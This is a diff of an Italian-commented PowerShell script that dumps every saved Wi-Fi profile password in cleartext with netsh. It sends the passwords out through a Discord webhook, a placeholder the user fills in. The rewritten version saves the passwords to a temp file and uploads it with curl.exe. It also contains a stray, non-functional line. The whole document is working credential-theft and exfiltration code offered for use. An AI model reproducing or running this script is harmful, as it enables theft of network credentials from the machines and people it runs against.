@@ -1,60 +1,55 @@
-# Script PowerShell per estrarre password Wi-Fi e caricarle su Discord.
+############################################################################################################################################################
+# Estrae le password dei profili Wi-Fi e le salva in un file temporaneo
+$wifiProfiles = (netsh wlan show profiles) | 
+    Select-String "\:(.+)$" | 
+    ForEach-Object {
+        $name = $_.Matches.Groups[1].Value.Trim()
+        $profileInfo = netsh wlan show profile name="$name" key=clear
+        $pass = ($profileInfo | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
+        
+        [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
+    } | 
+    Format-Table -AutoSize | 
+    Out-String 
 
-# Funzione per estrarre le password dei profili Wi-Fi
-function Get-WiFiPasswords {
-    $wifiProfiles = (netsh wlan show profiles) |
-        Select-String "\:(.+)$" | 
-        ForEach-Object {
-            $name = $_.Matches.Groups[1].Value.Trim()
-            # Estrai la chiave di accesso
-            $profileInfo = netsh wlan show profile name="$name" key=clear
-            $pass = ($profileInfo | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
+# Salva i profili Wi-Fi e le password in un file temporaneo
+$env:TEMP\wifi-passwords.txt
+Out-File -FilePath "$env:TEMP\wifi-passwords.txt" -InputObject $wifiProfiles
 
-            # Se la password è vuota, assegnare "N/A"
-            if (-not $pass) {
-                $pass = "N/A"
-            }
+############################################################################################################################################################
 
-            # Restituisci l'oggetto con i dettagli del Wi-Fi
-            [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
-        }
-
-    return $wifiProfiles
-}
-
-# Funzione di upload su Discord
+# Funzione per caricare le password su Discord
 function Upload-Discord {
+    [CmdletBinding()]
     param (
-        [string]$WebhookUrl,
-        [string]$Message
+        [parameter(Position=0, Mandatory=$True)] [string]$file,
+        [parameter(Position=1, Mandatory=$False)] [string]$text
     )
-    
+
+    $hookurl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
     $Body = @{
         'username' = $env:username
-        'content'  = $Message
+        'content'  = $text
     }
 
-    # Invia il messaggio
-    if (-not [string]::IsNullOrEmpty($Message)) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $WebhookUrl -Method Post -Body ($Body | ConvertTo-Json)
+    # Invia il messaggio di testo
+    if (-not [string]::IsNullOrEmpty($text)) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    # Carica il file delle password
+    if (-not [string]::IsNullOrEmpty($file)) {
+        curl.exe -F "file1=@$file" $hookurl
     }
 }
 
-# Main
-$wifiPasswords = Get-WiFiPasswords
-
-# Crea un messaggio con le password
-$message = "Ecco le password dei profili Wi-Fi salvati:`n`n"
-
-foreach ($profile in $wifiPasswords) {
-    $message += "Profilo: $($profile.PROFILE_NAME)`nPassword: $($profile.PASSWORD)`n`n"
+# Carica le password su Discord
+if (Test-Path "$env:TEMP\wifi-passwords.txt") {
+    Upload-Discord -file "$env:TEMP\wifi-passwords.txt" -text "Ecco le password dei profili Wi-Fi salvati:"
 }
 
-# Carica su Discord
-$discordWebhookUrl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
-if (-not [string]::IsNullOrEmpty($discordWebhookUrl)) {
-    Upload-Discord -WebhookUrl $discordWebhookUrl -Message $message
-}
+############################################################################################################################################################
 
-# Opzionale: visualizza un messaggio indicante la fine dell'operazione
-Write-Host "Le password sono state inviate a Discord."
+# Opzionale: Visualizza un messaggio indicante la fine dell'operazione
+Write-Host "Le password Wi-Fi sono state inviate a Discord."
+
